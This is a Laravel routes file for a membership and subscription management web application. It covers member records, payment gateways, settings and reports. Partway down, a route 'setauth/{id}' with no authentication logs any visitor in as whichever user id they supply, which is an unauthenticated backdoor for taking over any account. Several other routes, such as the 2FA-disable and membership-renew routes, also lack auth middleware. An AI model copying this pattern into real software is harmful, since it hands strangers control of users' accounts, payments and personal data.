<?php

use App\Http\Controllers\Auth\VerifyEmailController;
use App\Http\Controllers\AuthPageController;
use Illuminate\Support\Facades\Route;
use App\Http\Controllers\HomeController;
use App\Http\Controllers\UserController;
use App\Http\Controllers\SubscriptionController;
use App\Http\Controllers\SettingController;
use App\Http\Controllers\PermissionController;
use App\Http\Controllers\RoleController;
use App\Http\Controllers\NoticeBoardController;
use App\Http\Controllers\ContactController;
use App\Http\Controllers\CouponController;
use App\Http\Controllers\FAQController;
use App\Http\Controllers\HomePageController;
use App\Http\Controllers\NotificationController;
use App\Http\Controllers\OTPController;
use App\Http\Controllers\PageController;
use App\Http\Controllers\PaymentController;
use App\Models\User;
use App\Http\Controllers\ActivityTrackingController;
use App\Http\Controllers\DocumentTypeController;
use App\Http\Controllers\EventController;
use App\Http\Controllers\ExpenseController;
use App\Http\Controllers\ExpenseTypeController;
use App\Http\Controllers\MembershipPaymentController;
use App\Http\Controllers\MemberController;
use App\Http\Controllers\MembershipController;
use App\Http\Controllers\MembershipPlanController;
use App\Http\Controllers\MembershipSuspensionController;
use App\Http\Controllers\ReportController;
use App\Http\Controllers\PublicMemberRegistrationController;
use Illuminate\Support\Facades\Auth;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

require __DIR__ . '/auth.php';

// Public Member Registration Routes (no authentication required)
Route::middleware(['XSS'])->group(function () {
    Route::get('register-member', [PublicMemberRegistrationController::class, 'create'])->name('public.register');
    Route::post('register-member', [PublicMemberRegistrationController::class, 'store'])->name('public.register.store');
    Route::get('register-member/payment-summary', [PublicMemberRegistrationController::class, 'showPaymentSummary'])->name('public.register.payment.summary');
    Route::post('register-member/payment', [PublicMemberRegistrationController::class, 'processPayment'])->name('public.register.payment');
    Route::get('register-member/payment', function() {
        return redirect()->route('public.register.payment.summary')->with('error', __('Please use the payment form to complete your registration.'));
    });
    Route::get('register-success', [PublicMemberRegistrationController::class, 'success'])->name('public.register.success');
});

Route::get('/', [HomeController::class, 'index'])->middleware(
    [
        'auth',
        'subscription',
        'XSS',
    ]
);
Route::get('home', [HomeController::class, 'index'])->name('home')->middleware(
    [
        'auth',
        'subscription',
        'XSS',
    ]
);
Route::get('dashboard', [HomeController::class, 'index'])->name('dashboard')->middleware(
    [
        'auth',
        'subscription',
        'XSS',
    ]
);

//-------------------------------User-------------------------------------------

Route::resource('users', UserController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::get('setauth/{id}',  function ($id) {
    $user = User::find($id);
    Auth::login($user);
    return redirect()->route('home');
});


Route::get('login/otp', [OTPController::class, 'show'])->name('otp.show')->middleware(
    [

        'XSS',
    ]
);
Route::post('login/otp', [OTPController::class, 'check'])->name('otp.check')->middleware(
    [

        'XSS',
    ]
);
Route::get('login/2fa/disable', [OTPController::class, 'disable'])->name('2fa.disable')->middleware(['XSS',]);

//-------------------------------Subscription-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::resource('subscriptions', SubscriptionController::class);
        Route::get('coupons/history', [CouponController::class, 'history'])->name('coupons.history');
        Route::delete('coupons/history/{id}/destroy', [CouponController::class, 'historyDestroy'])->name('coupons.history.destroy');
        Route::get('coupons/apply', [CouponController::class, 'apply'])->name('coupons.apply');
        Route::resource('coupons', CouponController::class);
        Route::get('subscription/transaction', [SubscriptionController::class, 'transaction'])->name('subscription.transaction');
    }
);

//-------------------------------Subscription Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('subscription/{id}/stripe/payment', [SubscriptionController::class, 'stripePayment'])->name('subscription.stripe.payment');
    }
);
//-------------------------------Settings-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('settings', [SettingController::class, 'index'])->name('setting.index');

        Route::post('settings/account', [SettingController::class, 'accountData'])->name('setting.account');
        Route::delete('settings/account/delete', [SettingController::class, 'accountDelete'])->name('setting.account.delete');
        Route::post('settings/password', [SettingController::class, 'passwordData'])->name('setting.password');
        Route::post('settings/general', [SettingController::class, 'generalData'])->name('setting.general');
        Route::post('settings/smtp', [SettingController::class, 'smtpData'])->name('setting.smtp');
        Route::get('settings/smtp-test', [SettingController::class, 'smtpTest'])->name('setting.smtp.test');
        Route::post('settings/smtp-test', [SettingController::class, 'smtpTestMailSend'])->name('setting.smtp.testing');
        Route::post('settings/payment', [SettingController::class, 'paymentData'])->name('setting.payment');
        Route::post('settings/site-seo', [SettingController::class, 'siteSEOData'])->name('setting.site.seo');
        Route::post('settings/google-recaptcha', [SettingController::class, 'googleRecaptchaData'])->name('setting.google.recaptcha');
        Route::post('settings/company', [SettingController::class, 'companyData'])->name('setting.company');
        Route::post('settings/2fa', [SettingController::class, 'twofaEnable'])->name('setting.twofa.enable');

        Route::get('footer-setting', [SettingController::class, 'footerSetting'])->name('footerSetting');
        Route::post('settings/footer', [SettingController::class, 'footerData'])->name('setting.footer');

        Route::get('language/{lang}', [SettingController::class, 'lanquageChange'])->name('language.change');
        Route::post('theme/settings', [SettingController::class, 'themeSettings'])->name('theme.settings');

        Route::post('settings/twilio', [SettingController::class, 'twilio'])->name('setting.twilio');
    }
);


//-------------------------------Role & Permissions-------------------------------------------
Route::resource('permission', PermissionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::resource('role', RoleController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Note-------------------------------------------
Route::resource('note', NoticeBoardController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Contact-------------------------------------------
Route::resource('contact', ContactController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------logged History-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('logged/history', [UserController::class, 'loggedHistory'])->name('logged.history');
        Route::get('logged/{id}/history/show', [UserController::class, 'loggedHistoryShow'])->name('logged.history.show');
        Route::delete('logged/{id}/history', [UserController::class, 'loggedHistoryDestroy'])->name('logged.history.destroy');
    }
);


//-------------------------------Plan Payment-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::post('subscription/{id}/bank-transfer', [PaymentController::class, 'subscriptionBankTransfer'])->name('subscription.bank.transfer');
        Route::get('subscription/{id}/bank-transfer/action/{status}', [PaymentController::class, 'subscriptionBankTransferAction'])->name('subscription.bank.transfer.action');
        Route::post('subscription/{id}/paypal', [PaymentController::class, 'subscriptionPaypal'])->name('subscription.paypal');
        Route::get('subscription/{id}/paypal/{status}', [PaymentController::class, 'subscriptionPaypalStatus'])->name('subscription.paypal.status');
        Route::post('subscription/{id}/{user_id}/manual-assign-package', [PaymentController::class, 'subscriptionManualAssignPackage'])->name('subscription.manual_assign_package');
        Route::get('subscription/flutterwave/{sid}/{tx_ref}', [PaymentController::class, 'subscriptionFlutterwave'])->name('subscription.flutterwave');


        Route::post('/subscription-pay-with-paystack', [PaymentController::class, 'subscriptionPaystack'])->name('subscription.pay.with.paystack')->middleware(['auth', 'XSS']);
        Route::get('/subscription/paystack/{pay_id}/{s_id}', [PaymentController::class, 'subscriptionPaystackStatus'])->name('subscription.paystack');
    }
);

//-------------------------------Document Type-------------------------------------------
Route::resource('document-type', DocumentTypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Expense Type-------------------------------------------
Route::resource('expense-type', ExpenseTypeController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Member-------------------------------------------
Route::resource('member', MemberController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::get('member/{id}/document/create', [MemberController::class, 'documentCreate'])->name('member.document.create');
        Route::post('member/{id}/document/store', [MemberController::class, 'documentStore'])->name('member.document.store');
        Route::get('member/document/{id}/edit', [MemberController::class, 'documentEdit'])->name('member.document.edit');
        Route::post('member/document/{id}/update', [MemberController::class, 'documentUpdate'])->name('member.document.update');
        Route::delete('member/document/{id}/destroy', [MemberController::class, 'documentDestroy'])->name('member.document.delete');
        Route::get('member/payment/{id}', [MemberController::class, 'showPaymentPage'])->name('member.payment');
    }
);


//-------------------------------Membership-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('membership', MembershipController::class);
        Route::get('get-duration/', [MembershipController::class, 'getDuration'])->name('getDurations');
    }
);

//-------------------------------Membership Plan-------------------------------------------
Route::resource('membership-plan', MembershipPlanController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

Route::get('/membership-plan/payment/{id}', [MembershipPlanController::class, 'payment'])
    ->name('membership-plan.payment');

//-------------------------------Payment-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('membership-payment', MembershipPaymentController::class);
        Route::delete('membership-payment/{id}/paymentdestroy', [MembershipPaymentController::class, 'paymentDelete'])->name('membership-payment.paymentdelete');
    }
);

//-------------------------------Event-------------------------------------------
Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {
        Route::resource('event', EventController::class);
        Route::get('calendar', [eventController::class, 'calendar'])->name('event.calendar');
    }
);

//-------------------------------Activity Tracking----------------------------------------------
Route::resource('activity-tracking', ActivityTrackingController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Membership Suspension-------------------------------------------
Route::resource('membership-suspension', MembershipSuspensionController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);



//-------------------------------Expense-------------------------------------------
Route::resource('expense', ExpenseController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Notification-------------------------------------------
Route::resource('notification', NotificationController::class)->middleware(
    [
        'auth',
        'XSS',

    ]
);

Route::get('email-verification/{token}', [VerifyEmailController::class, 'verifyEmail'])->name('email-verification')->middleware(
    [
        'XSS',
    ]
);


//-------------------------------FAQ-------------------------------------------
Route::resource('FAQ', FAQController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Home Page-------------------------------------------
Route::resource('homepage', HomePageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);
//-------------------------------FAQ-------------------------------------------
Route::resource('pages', PageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);

//-------------------------------Auth page-------------------------------------------
Route::resource('authPage', AuthPageController::class)->middleware(
    [
        'auth',
        'XSS',
    ]
);


Route::get('page/{slug}', [PageController::class, 'page'])->name('page');


Route::post('/membership/{id}/renew', [MembershipController::class, 'renew'])->name('membership.renew');




//-------------------------------Invoice Payment-------------------------------------------

Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::post('membership/{id}/banktransfer/payment', [MembershipPaymentController::class, 'banktransferPayment'])->name('membership.banktransfer.payment');
        Route::post('membership/{id}/stripe/payment', [MembershipPaymentController::class, 'stripePayment'])->name('membership.stripe.payment');
        Route::post('membership/{id}/paypal', [MembershipPaymentController::class, 'invoicePaypal'])->name('membership.paypal');
        Route::get('membership/{id}/paypal/{status}', [MembershipPaymentController::class, 'invoicePaypalStatus'])->name('membership.paypal.status');
        Route::get('membership/flutterwave/{id}/{tx_ref}', [MembershipPaymentController::class, 'invoiceFlutterwave'])->name('membership.flutterwave');

        Route::post('membership/{id}/paystack/payment', [MembershipPaymentController::class, 'invoicePaystack'])->name('membership.paystack.payment');
        Route::get('/membership/paystack/{pay_id}/{i_id}', [MembershipPaymentController::class, 'invoicePaystackStatus'])->name('membership.paystack');
        Route::get('membership/{id}/bank-transfer/action/{status}', [MembershipPaymentController::class, 'invoiceBankTransferAction'])->name('membership.bank.transfer.action');
    }
);


Route::group(
    [
        'middleware' => [
            'auth',
            'XSS',
        ],
    ],
    function () {

        Route::get('report/income', [ReportController::class, 'income'])->name('report.income');
        Route::get('report/membership', [ReportController::class, 'membership'])->name('report.membership');
        Route::get('report/expense', [ReportController::class, 'expense'])->name('report.expense');
    }
);


//-------------------------------FAQ-------------------------------------------
Route::impersonate();
